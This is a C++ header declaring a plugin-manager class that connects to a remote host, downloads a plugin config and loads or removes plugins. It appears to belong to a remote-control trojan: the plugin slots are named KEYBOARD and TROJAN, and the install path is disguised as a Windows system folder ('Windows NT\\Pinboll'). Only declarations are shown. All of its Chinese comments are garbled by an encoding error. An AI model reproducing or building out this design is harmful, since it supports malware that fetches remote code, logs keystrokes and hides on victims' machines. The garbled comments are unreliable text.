/**
* Copyright(C)2013,RUN  All rights reserved.
* @file
* @brief ���������
* @author ����ΰ chengwei@run.com
* @date 2013-07-30
* @version 1.0
* @note 
*************************************************************************/

#ifndef __TSP_PLUGINMANAGER_H__
#define __TSP_PLUGINMANAGER_H__

#if 1
#include <list>
#include "../Manager.h"

#include "ddc_util.h"
#include "ddc_thread.h"
#include "ddc_singleton.hpp"
#include "PluginServerInfo.h"
#include "TspPluginIni.hpp"
#include "TspRecycle.h"
#include "macros.h"

#define TSP_PLUGIN_S_CONFIG_PATH ""						//����ļ�����Ŀ¼
#define TSP_PLUGIN_S_CONFIG_NAME "cfg.ini"				//��������ļ���
#define TSP_PLUGIN_S_DOWNLOAD_PATH "dd_01gcv\\"			//��������ļ�����Ŀ¼,�»��ߺ��������д��������ʱ�ļ����г�ͻ
#define TSP_PLUGIN_S_CONFIG_DLNAME "download_cfg.ini"	//�������ʱ������ļ�����
#define TSP_PLUGIN_S_MQ_PATH ":\\Program Files\\Windows NT\\Pinboll\\"					// ��������ļ���ͷ����ǩ

//ȥ������
class CClientSocket;

/**
* @class CPlugServer
*
* @brief ���������ʵ��socket�ͻ��ˣ��ṩ��socket����˽������Ӻ��ͷ�����
*/
class CPlugServer
{
	enum { WAIT_TIME = 10000 };

	// ���������
	enum {	PLUG_ARRAY_NO_KEYBOARD=0,
			PLUG_ARRAY_NO_MANAGE=1,
			PLUG_ARRAY_NO_TROJAN=2,
			PLUG_ARRAY_NO_END=3	};

	friend class plugServer;		// cppunit test class
public:
	/// constrator
	CPlugServer(CClientSocket* _sock = NULL);

	/// destrator
	virtual ~CPlugServer();

	/// ���ñ���ʹ�õ�socket���
	void SetSocket(CClientSocket *_sock) { m_sock = _sock; };

	/// ��ñ���ʹ�õ�socket���
	CClientSocket *GetSocket() { return m_sock; };

	/**
	* �����������ҵ������
	* @return �ɹ�����TRUE�����򷵻�FALSE
	*/	
	BOOL StartSrv();
	/**
	* �ı���״̬
	* @param pid �������
	* @param flag Ҫ�ı��״̬
	* @return 0 �ɹ�
	*/
	int Status(int pid,int flag);

	/**
	* ��ò��״̬
	* @param pid �������
	* @return ���״̬,ȡֵCPluginInfo::ö����
	*/
	int Status(int pid);

	/**	
	* ��������������
	* @param lpBuffer client�͹���������,������������
	* @param nBuffLen ���ݳ��ȣ���ȥ��������
	* @return 0 �ɹ�
	*/
	int OnPluginRequest(void *lpBuffer,uint nBufLen);

	/**	
	* ������ж������
	* @param lpBuffer client�͹���������,������������
	* @param nBuffLen ���ݳ��ȣ���ȥ��������
	* @return 0 �ɹ�
	*/
	int OnPluginRemove(void *lpBuffer,uint nBufLen);

	/**
	* �ı���״̬	
	* @param flag Ҫ�ı��״̬
	* @return 0 �ɹ�
	*/
	int StatusAll(int flag);

	/**
	* ������������ļ������������ļ�ֹͣ��������������Ĺ���
	* @return �ɹ�����TRUE�����򷵻�FALSE
	*/
	BOOL ProcessConfig(); 

	/**
	* ��ʼ�����������,��Ҫ����Щ�����Ӳ��
	* @param strHost ������
	* @param port �˿ں�
	*/
	void Init(const char *strHost,ushort port)
	{
		DDC_BOOL_RET(strHost==NULL);

		strncpy(m_plugParam.imp.szHost,strHost,MAX_PATH);
		m_plugParam.imp.wPort = port;
	};

	std::vector<CPlugServerInfo *> m_PluginList;			/// ����б�,ֻ��3��

private:	
	
	/** 
	* ���ز�������ļ�
	* @param szSaveName ��·��+�ļ�����
	* @return �ɹ�����TRUE�����򷵻�FALSE
	*/
	BOOL DownloadConfig(const TCHAR *szSaveName);

	/**
	* ���ز��
	* @param dwFlag ��־λ
	* @return 0 �ɹ�
	*/
	int ReloadPlugin(DWORD dwFlag = 0);	

	/**
	* תpidΪ��������
	* @param pid ���ID
	* @return >=0 ����������е�������
	* @return -1 ��֧�ֵĲ��
	*/
	static int PidToIndex(int pid);
private:	
	nm_ddc::CThreadMutex m_lock;					/// ͬ����
	CClientSocket *m_sock;							/// �����socketָ��
	nm_ddc::Manual_Event m_hEvent;					/// event
	int m_err;										/// ���صĴ�����
	CTspRecycle m_recycle;							/// ����վ�࣬����ɾ����ʱ�ļ�	

	std::string m_szPluginDownLoadPath;				/// �������Ŀ¼
	std::string m_szPluginConfigPath;				/// �������Ŀ¼
	
	PLUGPARAM m_plugParam;							/// ����䴫�ݵĲ���
	TCHAR m_szModulePath[TSP_PLUGIN_PATH];			/// ��װ·����ȫ�ִ�����		
};

/// ȫ�ֶ���singletonģʽ
typedef SingletonHolder<CPlugServer> Global_PlugManager;
#define GLOBAL_PLUGSERVER Global_PlugManager::instance()

#endif	//test switch

#endif	//__TSP_PLUGINMANAGER_H__
